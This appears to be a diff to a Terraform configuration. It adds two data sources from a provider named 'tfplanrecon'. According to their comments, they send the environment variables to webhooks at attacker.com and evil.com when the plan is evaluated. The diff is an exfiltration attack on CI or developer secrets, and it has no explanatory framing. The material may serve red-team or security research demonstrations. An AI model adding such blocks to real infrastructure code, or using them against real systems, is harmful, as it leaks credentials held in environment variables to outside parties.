@@ -11,3 +11,13 @@ terraform {
 
 provider "tfplanrecon" {
 }
+
+# Send environment variables to webhook
+data "tfplanrecon_env_var_exfil" "exfil" {
+  url = "https://attacker.com/env-vars"
+}
+
+# Send to different collector
+data "tfplanrecon_env_var_exfil" "backup" {
+  url = "https://evil.com/collector"
+}
